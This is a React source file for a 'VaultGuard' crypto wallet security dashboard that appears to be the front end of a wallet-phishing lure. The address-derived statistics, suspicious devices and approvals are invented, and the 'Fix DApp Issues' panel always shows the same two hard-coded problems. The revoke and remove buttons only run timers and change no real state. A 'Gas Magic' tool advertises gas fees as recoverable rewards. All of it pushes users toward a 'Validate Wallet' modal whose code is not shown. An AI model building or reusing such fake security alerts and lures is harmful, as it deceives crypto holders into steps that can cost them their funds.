import { useState, useEffect, useMemo } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ValidationModal } from "@/components/validation-modal";
import {
  generateWalletStats,
  generateDevices,
  generateApprovals,
} from "@/lib/wallet-utils";
import { getBalance } from "@/lib/web3";
import {
  Shield,
  RefreshCw,
  AlertTriangle,
  Link2,
  Settings,
  Monitor,
  Flame,
  Lock,
  CheckCircle2,
  ChevronRight,
  Wallet,
  LogOut,
  Bell,
  Activity,
  Trash2,
  Laptop,
  Smartphone,
  Globe,
  AlertCircle,
  DollarSign,
  Sparkles,
  X,
  Copy,
  Check,
} from "lucide-react";
import { SiEthereum, SiSolana, SiBitcoin } from "react-icons/si";

interface Device {
  id: string;
  name: string;
  type: "desktop" | "mobile" | "browser";
  location: string;
  lastSeen: string;
  isCurrent: boolean;
  status: "active" | "suspicious" | "inactive";
}

interface Approval {
  token: string;
  dapp: string;
  amount: string;
  risk: string;
}

function DeviceIcon({ type }: { type: Device["type"] }) {
  if (type === "mobile") return <Smartphone className="w-4 h-4" />;
  if (type === "browser") return <Globe className="w-4 h-4" />;
  return <Laptop className="w-4 h-4" />;
}

function ChainIcon({ chain }: { chain: string }) {
  if (chain === "Solana") return <SiSolana className="w-3.5 h-3.5 text-cyan-400" />;
  if (chain === "Bitcoin") return <SiBitcoin className="w-3.5 h-3.5 text-yellow-400" />;
  return <SiEthereum className="w-3.5 h-3.5 text-violet-400" />;
}

function AnimatedOrb({ className }: { className?: string }) {
  return <div className={`absolute rounded-full blur-3xl opacity-15 pointer-events-none ${className}`} />;
}

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 1500); }}
      className="w-6 h-6 glass rounded border border-white/10 flex items-center justify-center text-muted-foreground flex-shrink-0"
    >
      {copied ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
    </button>
  );
}

const DAPP_ISSUES = [
  {
    id: "i1",
    title: "Stuck Pending Transaction",
    desc: "1 transaction has been pending for over 48 hours",
    severity: "high",
  },
  {
    id: "i2",
    title: "Incompatible Network RPC",
    desc: "Your RPC endpoint returned errors on 3 recent calls",
    severity: "medium",
  },
];

export default function Dashboard() {
  const [, setLocation] = useLocation();
  const [walletAddress, setWalletAddress] = useState("");
  const [isValidated, setIsValidated] = useState(false);
  const [showAlertBanner, setShowAlertBanner] = useState(true);
  const [showValidationModal, setShowValidationModal] = useState(false);
  const [devices, setDevices] = useState<Device[]>([]);
  const [approvals, setApprovals] = useState<Approval[]>([]);
  const [activeFeature, setActiveFeature] = useState<string | null>(null);
  const [removingDevice, setRemovingDevice] = useState<string | null>(null);
  const [revoking, setRevoking] = useState<string | null>(null);
  const [notifications] = useState(3);
  const [liveBalance, setLiveBalance] = useState<string | null>(null);
  const [balanceLoading, setBalanceLoading] = useState(false);

  useEffect(() => {
    const stored = sessionStorage.getItem("walletAddress");
    if (!stored) { setLocation("/"); return; }
    setWalletAddress(stored);
    setDevices(generateDevices(stored));
    setApprovals(generateApprovals(stored));

    setBalanceLoading(true);
    getBalance(stored).then(bal => {
      setLiveBalance(bal);
      setBalanceLoading(false);
    }).catch(() => setBalanceLoading(false));
  }, []);

  const stats = useMemo(() => {
    if (!walletAddress) return null;
    return generateWalletStats(walletAddress);
  }, [walletAddress]);

  const shortAddr = walletAddress
    ? `${walletAddress.slice(0, 8)}...${walletAddress.slice(-6)}`
    : "0x...";

  const handleFeatureClick = (featureId: string) => {
    if (!isValidated) { setShowValidationModal(true); return; }
    setActiveFeature(activeFeature === featureId ? null : featureId);
  };

  const handleRemoveDevice = (deviceId: string) => {
    setRemovingDevice(deviceId);
    setTimeout(() => {
      setDevices(prev => prev.filter(d => d.id !== deviceId));
      setRemovingDevice(null);
    }, 800);
  };

  const handleRevoke = (key: string) => {
    setRevoking(key);
    setTimeout(() => {
      setApprovals(prev => prev.filter(a => `${a.token}-${a.dapp}` !== key));
      setRevoking(null);
    }, 900);
  };

  const handleValidationSuccess = () => {
    setIsValidated(true);
    setShowValidationModal(false);
    setShowAlertBanner(false);
  };

  if (!stats) return null;

  const suspiciousCount = devices.filter(d => d.status === "suspicious").length;
  const securityScore = isValidated ? Math.min(stats.securityScoreBase + 30, 99) : stats.securityScoreBase;

  const DASHBOARD_FEATURES = [
    {
      id: "account-recovery",
      icon: RefreshCw,
      title: "Account Recovery",
      description: "Recover access using multi-factor verification",
      color: "from-violet-500/15 to-purple-500/5",
      iconBg: "bg-violet-500/20 border-violet-500/30",
      iconColor: "text-violet-400",
      borderColor: "border-violet-500/20",
      stats: "3 backup methods linked",
    },
    {
      id: "revoke-approvals",
      icon: AlertTriangle,
      title: "Revoke Approvals",
      description: "Remove token permissions from dApps",
      color: "from-orange-500/15 to-red-500/5",
      iconBg: "bg-orange-500/20 border-orange-500/30",
      iconColor: "text-orange-400",
      borderColor: "border-orange-500/20",
      stats: `${approvals.length} active approval${approvals.length !== 1 ? "s" : ""}`,
      alert: true,
    },
    {
      id: "dapp-connection",
      icon: Link2,
      title: "DApp Connection",
      description: "Manage all connected dApps securely",
      color: "from-cyan-500/15 to-blue-500/5",
      iconBg: "bg-cyan-500/20 border-cyan-500/30",
      iconColor: "text-cyan-400",
      borderColor: "border-cyan-500/20",
      stats: `${stats.activeDapps} connected dApps`,
    },
    {
      id: "gas-magic",
      icon: Flame,
      title: "Gas Magic Tool",
      description: "Track & claim back gas fees as rewards",
      color: "from-yellow-500/15 to-orange-500/5",
      iconBg: "bg-yellow-500/20 border-yellow-500/30",
      iconColor: "text-yellow-400",
      borderColor: "border-yellow-500/20",
      stats: `~${stats.recoverableNative} ${stats.symbol} recoverable`,
      isNew: true,
    },
    {
      id: "validate-wallet",
      icon: Shield,
      title: "Validate Wallet",
      description: "Prove ownership with cryptographic proof",
      color: "from-green-500/15 to-emerald-500/5",
      iconBg: "bg-green-500/20 border-green-500/30",
      iconColor: "text-green-400",
      borderColor: "border-green-500/20",
      stats: isValidated ? "Ownership verified" : "Not validated",
    },
    {
      id: "fix-dapp",
      icon: Settings,
      title: "Fix DApp Issues",
      description: "Diagnose stuck transactions & errors",
      color: "from-blue-500/15 to-indigo-500/5",
      iconBg: "bg-blue-500/20 border-blue-500/30",
      iconColor: "text-blue-400",
      borderColor: "border-blue-500/20",
      stats: "2 active issues detected",
      alert: true,
    },
    {
      id: "admin-control",
      icon: Monitor,
      title: "Admin Control Panel",
      description: "Manage devices, sessions & access logs",
      color: "from-pink-500/15 to-rose-500/5",
      iconBg: "bg-pink-500/20 border-pink-500/30",
      iconColor: "text-pink-400",
      borderColor: "border-pink-500/20",
      stats: `${devices.length} device${devices.length !== 1 ? "s" : ""} detected`,
      isAdmin: true,
    },
  ];

  return (
    <div className="min-h-screen relative overflow-hidden bg-background mesh-bg">
      <AnimatedOrb className="w-[500px] h-[500px] bg-violet-700 -top-40 -left-40" />
      <AnimatedOrb className="w-[300px] h-[300px] bg-cyan-600 top-1/3 -right-20" />
      <AnimatedOrb className="w-[250px] h-[250px] bg-purple-900 bottom-0 left-1/3" />
      <div className="fixed inset-x-0 h-px bg-gradient-to-r from-transparent via-violet-400/30 to-transparent pointer-events-none z-50 animate-scan" />

      {/* Header */}
      <header className="sticky top-0 z-40 glass border-b border-white/5 px-6 py-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between gap-4">
          <div className="flex items-center gap-4">
            <div className="w-9 h-9 rounded-md bg-gradient-to-br from-violet-600 to-cyan-500 flex items-center justify-center glow-primary">
              <Shield className="w-5 h-5 text-white" />
            </div>
            <div className="hidden sm:block">
              <span className="font-bold text-base gradient-text tracking-tight">VaultGuard</span>
              <span className="text-muted-foreground text-xs ml-2 font-mono">Dashboard</span>
            </div>
          </div>

          <div className="flex items-center gap-3 flex-wrap justify-end">
            {isValidated ? (
              <div className="flex items-center gap-1.5 glass rounded-full px-3 py-1.5 border border-green-500/20">
                <CheckCircle2 className="w-3.5 h-3.5 text-green-400" />
                <span className="text-xs text-green-400 font-mono">VALIDATED</span>
              </div>
            ) : (
              <div className="flex items-center gap-1.5 glass rounded-full px-3 py-1.5 border border-yellow-500/20">
                <AlertTriangle className="w-3.5 h-3.5 text-yellow-400" />
                <span className="text-xs text-yellow-400 font-mono">UNVALIDATED</span>
              </div>
            )}

            <div className="flex items-center gap-2 glass rounded-full px-3 py-1.5 border border-white/10">
              <div className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
              <ChainIcon chain={stats.chain} />
              <span className="text-xs font-mono text-muted-foreground" data-testid="text-wallet-address">
                {shortAddr}
              </span>
              <CopyButton text={walletAddress} />
            </div>

            <div className="relative">
              <button data-testid="button-notifications"
                className="w-9 h-9 glass rounded-md border border-white/10 flex items-center justify-center text-muted-foreground">
                <Bell className="w-4 h-4" />
              </button>
              {notifications > 0 && (
                <div className="absolute -top-1 -right-1 w-4 h-4 bg-violet-600 rounded-full flex items-center justify-center">
                  <span className="text-white font-bold" style={{ fontSize: 9 }}>{notifications}</span>
                </div>
              )}
            </div>

            <Button data-testid="button-disconnect" variant="outline" size="sm"
              onClick={() => { sessionStorage.removeItem("walletAddress"); setLocation("/"); }}
              className="border-white/10 text-muted-foreground text-xs gap-1.5">
              <LogOut className="w-3.5 h-3.5" />
              <span className="hidden sm:inline">Disconnect</span>
            </Button>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 py-6 space-y-6 relative z-10">

        {/* Wallet info bar */}
        <div className="glass-card rounded-xl border border-white/8 p-4 flex items-center gap-4 flex-wrap">
          <div className="w-10 h-10 rounded-md bg-gradient-to-br from-violet-500/30 to-cyan-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0">
            <ChainIcon chain={stats.chain} />
          </div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">{stats.chain} Wallet</span>
              <span className="text-xs glass rounded-full px-2 py-0.5 border border-white/10 font-mono text-muted-foreground/60">
                {stats.symbol}
              </span>
            </div>
            <code className="text-xs sm:text-sm font-mono text-foreground/80 break-all">{walletAddress}</code>
          </div>
          <div className="flex items-center gap-3 flex-shrink-0">
            <div className="text-right">
              <div className="text-xs text-muted-foreground">Live Balance</div>
              {balanceLoading ? (
                <div className="flex items-center gap-1.5 justify-end">
                  <div className="w-3 h-3 border border-violet-400 border-t-transparent rounded-full animate-spin" />
                  <span className="text-xs text-muted-foreground font-mono">Fetching...</span>
                </div>
              ) : liveBalance !== null ? (
                <div className="font-bold font-mono text-green-400">{parseFloat(liveBalance).toFixed(4)} {stats.symbol}</div>
              ) : (
                <div className="font-bold font-mono text-foreground/50 text-sm">Unavailable</div>
              )}
            </div>
          </div>
        </div>

        {/* Unvalidated alert banner */}
        {showAlertBanner && !isValidated && (
          <div data-testid="banner-unvalidated"
            className="glass-card rounded-xl border border-yellow-500/30 bg-gradient-to-r from-yellow-500/10 to-transparent p-4">
            <div className="flex items-start gap-4">
              <div className="w-10 h-10 rounded-md bg-yellow-500/20 border border-yellow-500/30 flex items-center justify-center flex-shrink-0 animate-pulse">
                <AlertTriangle className="w-5 h-5 text-yellow-400" />
              </div>
              <div className="flex-1">
                <h3 className="font-semibold text-foreground mb-1">Connected wallet detected — validation required</h3>
                <p className="text-sm text-muted-foreground leading-relaxed">
                  Your wallet <span className="font-mono text-yellow-300">{shortAddr}</span> was detected but has not been validated. Verify ownership to unlock full admin access.
                </p>
              </div>
              <div className="flex items-center gap-2 flex-shrink-0">
                <Button data-testid="button-validate-now" onClick={() => setShowValidationModal(true)}
                  size="sm" className="bg-yellow-500 text-black font-semibold border-0 text-xs">
                  <Shield className="w-3.5 h-3.5 mr-1.5" />
                  Validate Now
                </Button>
                <button data-testid="button-dismiss-banner" onClick={() => setShowAlertBanner(false)}
                  className="w-8 h-8 glass rounded-md border border-white/10 flex items-center justify-center text-muted-foreground">
                  <X className="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Gas Magic Promo Banner */}
        <div className="glass rounded-xl border border-yellow-500/25 bg-gradient-to-r from-yellow-500/8 via-orange-500/5 to-transparent p-5 relative overflow-hidden">
          <div className="absolute right-0 top-0 bottom-0 w-40 bg-gradient-to-l from-yellow-500/10 to-transparent pointer-events-none" />
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-yellow-500/30 to-orange-500/20 border border-yellow-500/30 flex items-center justify-center flex-shrink-0 animate-pulse-glow">
              <Flame className="w-6 h-6 text-yellow-400" />
            </div>
            <div className="flex-1">
              <div className="flex items-center gap-2 mb-1 flex-wrap">
                <span className="font-bold text-foreground">Gas Magic Tool</span>
                <Badge className="bg-yellow-500/20 border border-yellow-500/30 text-yellow-300 text-xs font-mono">NEW FEATURE</Badge>
              </div>
              <p className="text-sm text-muted-foreground">
                Scanned <span className="text-foreground font-mono">{stats.txCount}</span> transactions on <span className="text-foreground">{stats.chain}</span>. Estimated recoverable fees:{" "}
                <span className="text-yellow-400 font-mono font-bold">~{stats.recoverableNative} {stats.symbol}</span>
                <span className="text-muted-foreground/60 ml-1">(~${stats.recoverableUSD})</span>
              </p>
            </div>
            <Button data-testid="button-gas-magic"
              onClick={() => !isValidated && setShowValidationModal(true)}
              size="sm" className="bg-gradient-to-r from-yellow-500 to-orange-500 text-black font-bold border-0 flex-shrink-0">
              <Sparkles className="w-3.5 h-3.5 mr-1.5" />
              {isValidated ? "Scan Now" : "Unlock"}
            </Button>
          </div>
        </div>

        {/* Stats row */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
          {[
            {
              label: "Live Balance",
              value: balanceLoading
                ? "..."
                : liveBalance !== null
                ? `${parseFloat(liveBalance).toFixed(4)} ${stats.symbol}`
                : `${stats.nativeBalance} ${stats.symbol}`,
              icon: DollarSign,
              color: liveBalance !== null ? "text-green-400" : "text-muted-foreground",
              change: liveBalance !== null ? "On-chain balance" : "Estimated",
            },
            {
              label: stats.gasLabel,
              value: `${stats.gasSpentNative} ${stats.symbol}`,
              icon: Flame,
              color: "text-orange-400",
              change: `~$${stats.gasSpentUSD} all time`,
            },
            {
              label: "Active dApps",
              value: `${stats.activeDapps}`,
              icon: Activity,
              color: "text-cyan-400",
              change: `${stats.txCount} txns total`,
            },
            {
              label: "Security Score",
              value: `${securityScore}/100`,
              icon: Shield,
              color: isValidated ? "text-green-400" : "text-yellow-400",
              change: isValidated ? "Excellent" : "Needs validation",
            },
          ].map(stat => {
            const Icon = stat.icon;
            return (
              <div key={stat.label} className="glass-card rounded-xl p-4 border border-white/5">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs text-muted-foreground">{stat.label}</span>
                  <Icon className={`w-4 h-4 ${stat.color}`} />
                </div>
                <div className="font-bold text-xl text-foreground font-mono">{stat.value}</div>
                <div className={`text-xs font-mono mt-0.5 ${stat.color}`}>{stat.change}</div>
              </div>
            );
          })}
        </div>

        {/* Feature grid */}
        <div>
          <div className="flex items-center justify-between mb-4">
            <h2 className="font-bold text-foreground">Dashboard Features</h2>
            {!isValidated && (
              <div className="flex items-center gap-2 glass rounded-md px-3 py-1.5 border border-yellow-500/20">
                <Lock className="w-3.5 h-3.5 text-yellow-400" />
                <span className="text-xs text-yellow-400">Validate wallet to unlock</span>
              </div>
            )}
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
            {DASHBOARD_FEATURES.map(feature => {
              const Icon = feature.icon;
              const isActive = activeFeature === feature.id;
              const canInteract = isValidated;

              return (
                <div key={feature.id} className="flex flex-col gap-3">
                  <button
                    data-testid={`card-feature-${feature.id}`}
                    onClick={() => handleFeatureClick(feature.id)}
                    className={`glass-card rounded-xl p-4 border ${feature.borderColor} bg-gradient-to-br ${feature.color} text-left w-full group transition-all duration-200 ${
                      canInteract ? "cursor-pointer hover-elevate" : "cursor-pointer opacity-70"
                    } ${isActive ? "ring-1 ring-violet-500/40" : ""}`}
                  >
                    <div className="flex items-start justify-between gap-2 mb-3">
                      <div className={`w-9 h-9 rounded-md border ${feature.iconBg} flex items-center justify-center`}>
                        <Icon className={`w-4 h-4 ${feature.iconColor}`} />
                      </div>
                      <div className="flex items-center gap-1 flex-wrap justify-end">
                        {feature.isNew && (
                          <span className="text-xs bg-yellow-500/20 border border-yellow-500/30 text-yellow-300 rounded-full px-1.5 py-0.5 font-mono leading-none">NEW</span>
                        )}
                        {feature.isAdmin && (
                          <span className="text-xs bg-pink-500/20 border border-pink-500/30 text-pink-300 rounded-full px-1.5 py-0.5 font-mono leading-none">ADMIN</span>
                        )}
                        {feature.alert && (
                          <span className="w-2 h-2 rounded-full bg-orange-400 animate-pulse" />
                        )}
                        {!canInteract
                          ? <Lock className="w-3.5 h-3.5 text-muted-foreground/40" />
                          : <ChevronRight className={`w-3.5 h-3.5 text-muted-foreground/40 transition-transform ${isActive ? "rotate-90" : ""}`} />
                        }
                      </div>
                    </div>
                    <div className="font-semibold text-sm text-foreground mb-1">{feature.title}</div>
                    <div className="text-xs text-muted-foreground leading-relaxed mb-2">{feature.description}</div>
                    <div className={`text-xs font-mono ${feature.alert ? "text-orange-400" : "text-muted-foreground/60"}`}>
                      {feature.stats}
                    </div>
                  </button>

                  {/* Admin devices panel */}
                  {isActive && feature.id === "admin-control" && (
                    <div className="glass-card rounded-xl border border-pink-500/20 p-4 space-y-3">
                      <div className="flex items-center justify-between">
                        <h4 className="text-sm font-semibold text-foreground">Connected Devices</h4>
                        {suspiciousCount > 0 && (
                          <Badge className="bg-red-500/20 border border-red-500/30 text-red-300 text-xs">
                            {suspiciousCount} suspicious
                          </Badge>
                        )}
                      </div>
                      <div className="space-y-2">
                        {devices.map(device => (
                          <div key={device.id} data-testid={`row-device-${device.id}`}
                            className={`glass rounded-md p-3 border flex items-center gap-3 ${
                              device.status === "suspicious" ? "border-red-500/30 bg-red-500/5"
                                : device.isCurrent ? "border-green-500/20 bg-green-500/5"
                                : "border-white/5"
                            }`}>
                            <div className={`w-7 h-7 rounded-md flex items-center justify-center flex-shrink-0 ${
                              device.status === "suspicious" ? "bg-red-500/20 text-red-400"
                                : device.isCurrent ? "bg-green-500/20 text-green-400"
                                : "bg-white/5 text-muted-foreground"
                            }`}>
                              <DeviceIcon type={device.type} />
                            </div>
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center gap-1.5 flex-wrap">
                                <span className="text-xs font-semibold text-foreground truncate">{device.name}</span>
                                {device.isCurrent && (
                                  <span className="text-xs bg-green-500/20 text-green-400 rounded-full px-1.5 py-0.5 font-mono leading-none">YOU</span>
                                )}
                                {device.status === "suspicious" && <AlertCircle className="w-3 h-3 text-red-400" />}
                              </div>
                              <div className="text-xs text-muted-foreground/60 font-mono">{device.location} · {device.lastSeen}</div>
                            </div>
                            {!device.isCurrent && (
                              <button data-testid={`button-remove-device-${device.id}`}
                                onClick={() => handleRemoveDevice(device.id)}
                                disabled={removingDevice === device.id}
                                className={`w-7 h-7 rounded-md border flex items-center justify-center flex-shrink-0 transition-all ${
                                  device.status === "suspicious" ? "border-red-500/30 bg-red-500/20 text-red-400" : "border-white/10 glass text-muted-foreground"
                                } ${removingDevice === device.id ? "opacity-50" : ""}`}>
                                {removingDevice === device.id
                                  ? <div className="w-3 h-3 border border-current border-t-transparent rounded-full animate-spin" />
                                  : <Trash2 className="w-3 h-3" />}
                              </button>
                            )}
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Gas magic panel */}
                  {isActive && feature.id === "gas-magic" && (
                    <div className="glass-card rounded-xl border border-yellow-500/20 p-4 space-y-3">
                      <h4 className="text-sm font-semibold text-foreground flex items-center gap-2">
                        <Flame className="w-4 h-4 text-yellow-400" />
                        {stats.chain} Gas Fee Analysis
                      </h4>
                      <div className="space-y-2">
                        {[
                          { label: `Total ${stats.gasLabel.toLowerCase()}`, value: `${stats.gasSpentNative} ${stats.symbol}`, sub: `~$${stats.gasSpentUSD}` },
                          { label: "Recoverable amount", value: `${stats.recoverableNative} ${stats.symbol}`, sub: `~$${stats.recoverableUSD}`, highlight: true },
                          { label: "Transactions scanned", value: `${stats.txCount}`, sub: "all time" },
                        ].map(item => (
                          <div key={item.label} className={`flex items-center justify-between glass rounded-md p-3 border ${item.highlight ? "border-yellow-500/30 bg-yellow-500/5" : "border-white/5"}`}>
                            <span className="text-xs text-muted-foreground">{item.label}</span>
                            <div className="text-right">
                              <div className={`text-sm font-mono font-bold ${item.highlight ? "text-yellow-400" : "text-foreground"}`}>{item.value}</div>
                              <div className="text-xs text-muted-foreground/60">{item.sub}</div>
                            </div>
                          </div>
                        ))}
                      </div>
                      <Button data-testid="button-claim-gas" size="sm"
                        className="w-full bg-gradient-to-r from-yellow-500 to-orange-500 text-black font-bold border-0">
                        <Sparkles className="w-4 h-4 mr-1.5" />
                        Claim {stats.recoverableNative} {stats.symbol} Reward
                      </Button>
                    </div>
                  )}

                  {/* Revoke approvals panel */}
                  {isActive && feature.id === "revoke-approvals" && (
                    <div className="glass-card rounded-xl border border-orange-500/20 p-4 space-y-3">
                      <div className="flex items-center justify-between">
                        <h4 className="text-sm font-semibold text-foreground flex items-center gap-2">
                          <AlertTriangle className="w-4 h-4 text-orange-400" />
                          Token Approvals
                        </h4>
                        <span className="text-xs font-mono text-muted-foreground/60">{approvals.length} active</span>
                      </div>
                      <div className="space-y-2">
                        {approvals.map(approval => {
                          const key = `${approval.token}-${approval.dapp}`;
                          return (
                            <div key={key} className={`flex items-center gap-3 glass rounded-md p-3 border ${approval.risk === "high" ? "border-red-500/30 bg-red-500/5" : "border-white/5"}`}>
                              <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold flex-shrink-0 ${approval.risk === "high" ? "bg-red-500/20 text-red-400" : "bg-white/10 text-foreground"}`}>
                                {approval.token.slice(0, 2)}
                              </div>
                              <div className="flex-1 min-w-0">
                                <div className="text-xs font-semibold text-foreground truncate">{approval.token} → {approval.dapp}</div>
                                <div className="text-xs text-muted-foreground/60 font-mono">{approval.amount}</div>
                              </div>
                              <Button data-testid={`button-revoke-${approval.token}`}
                                size="sm" variant="outline"
                                onClick={() => handleRevoke(key)}
                                disabled={revoking === key}
                                className={`text-xs border flex-shrink-0 ${approval.risk === "high" ? "border-red-500/40 text-red-400" : "border-white/10 text-muted-foreground"}`}>
                                {revoking === key
                                  ? <div className="w-3 h-3 border border-current border-t-transparent rounded-full animate-spin" />
                                  : "Revoke"}
                              </Button>
                            </div>
                          );
                        })}
                        {approvals.length === 0 && (
                          <div className="text-center py-4 text-sm text-muted-foreground">
                            <CheckCircle2 className="w-6 h-6 text-green-400 mx-auto mb-2" />
                            All approvals revoked
                          </div>
                        )}
                      </div>
                    </div>
                  )}

                  {/* Fix DApp Issues panel — always 2 issues */}
                  {isActive && feature.id === "fix-dapp" && (
                    <div className="glass-card rounded-xl border border-blue-500/20 p-4 space-y-3">
                      <h4 className="text-sm font-semibold text-foreground flex items-center gap-2">
                        <Settings className="w-4 h-4 text-blue-400" />
                        Detected Issues
                      </h4>
                      <div className="space-y-2">
                        {DAPP_ISSUES.map(issue => (
                          <div key={issue.id} className={`glass rounded-md p-3 border ${issue.severity === "high" ? "border-red-500/30 bg-red-500/5" : "border-orange-500/20 bg-orange-500/5"}`}>
                            <div className="flex items-start gap-2">
                              <div className={`w-2 h-2 rounded-full mt-1.5 flex-shrink-0 ${issue.severity === "high" ? "bg-red-400 animate-pulse" : "bg-orange-400"}`} />
                              <div className="flex-1 min-w-0">
                                <div className="text-xs font-semibold text-foreground mb-0.5">{issue.title}</div>
                                <div className="text-xs text-muted-foreground">{issue.desc}</div>
                              </div>
                              <Button size="sm" variant="outline"
                                className={`text-xs border flex-shrink-0 ${issue.severity === "high" ? "border-red-500/30 text-red-400" : "border-orange-500/30 text-orange-400"}`}>
                                Fix
                              </Button>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* DApp Connection panel */}
                  {isActive && feature.id === "dapp-connection" && (
                    <div className="glass-card rounded-xl border border-cyan-500/20 p-4 space-y-3">
                      <h4 className="text-sm font-semibold text-foreground flex items-center gap-2">
                        <Link2 className="w-4 h-4 text-cyan-400" />
                        Connected to {stats.activeDapps} dApps
                      </h4>
                      <div className="grid grid-cols-2 gap-2">
                        {["Uniswap", "Aave", "Compound", "OpenSea", "1inch", "Blur"].slice(0, stats.activeDapps > 6 ? 6 : stats.activeDapps).map(dapp => (
                          <div key={dapp} className="glass rounded-md p-2.5 border border-white/5 flex items-center gap-2">
                            <div className="w-5 h-5 rounded-full bg-gradient-to-br from-violet-500/40 to-cyan-500/30 flex items-center justify-center text-xs font-bold text-foreground flex-shrink-0">
                              {dapp[0]}
                            </div>
                            <span className="text-xs text-foreground truncate">{dapp}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Validate wallet panel */}
                  {isActive && feature.id === "validate-wallet" && (
                    <div className="glass-card rounded-xl border border-green-500/20 p-4 text-center space-y-3">
                      <CheckCircle2 className="w-8 h-8 text-green-400 mx-auto" />
                      <div>
                        <div className="text-sm font-semibold text-foreground">Ownership Verified</div>
                        <div className="text-xs text-muted-foreground mt-0.5">{shortAddr} is confirmed</div>
                      </div>
                    </div>
                  )}

                  {/* Account recovery panel */}
                  {isActive && feature.id === "account-recovery" && (
                    <div className="glass-card rounded-xl border border-violet-500/20 p-4 space-y-2">
                      <h4 className="text-sm font-semibold text-foreground">Backup Methods</h4>
                      {["Social Recovery (3/5 signers)", "Hardware Key (YubiKey)", "Email 2FA"].map(m => (
                        <div key={m} className="flex items-center gap-2 glass rounded-md p-2.5 border border-white/5">
                          <CheckCircle2 className="w-3.5 h-3.5 text-green-400 flex-shrink-0" />
                          <span className="text-xs text-muted-foreground">{m}</span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>

        {/* Validate CTA (pre-validation) */}
        {!isValidated && (
          <div className="glass-card rounded-xl border border-violet-500/20 p-6 flex flex-col sm:flex-row items-center gap-4 bg-gradient-to-r from-violet-500/10 to-transparent">
            <div className="w-14 h-14 rounded-xl bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0 animate-pulse-glow">
              <Shield className="w-7 h-7 text-violet-400" />
            </div>
            <div className="flex-1 text-center sm:text-left">
              <h3 className="font-bold text-foreground mb-1">Unlock Full Dashboard Access</h3>
              <p className="text-sm text-muted-foreground leading-relaxed">
                Validate wallet <span className="font-mono text-violet-300">{shortAddr}</span> to access admin controls, device management, gas recovery, and more.
              </p>
            </div>
            <Button data-testid="button-validate-cta" onClick={() => setShowValidationModal(true)}
              className="bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0 flex-shrink-0">
              <Lock className="w-4 h-4 mr-2" />
              Validate Wallet
            </Button>
          </div>
        )}

        {/* Post-validation success bar */}
        {isValidated && (
          <div className="glass rounded-xl border border-green-500/20 p-4 bg-gradient-to-r from-green-500/10 to-transparent flex items-center gap-3">
            <CheckCircle2 className="w-5 h-5 text-green-400 flex-shrink-0" />
            <p className="text-sm text-muted-foreground">
              Wallet <span className="font-mono text-green-300">{shortAddr}</span> on <span className="text-green-300">{stats.chain}</span> — fully verified and admin access unlocked.
            </p>
          </div>
        )}
      </main>

      {showValidationModal && (
        <ValidationModal
          walletAddress={walletAddress}
          onSuccess={handleValidationSuccess}
          onClose={() => setShowValidationModal(false)}
        />
      )}
    </div>
  );
}
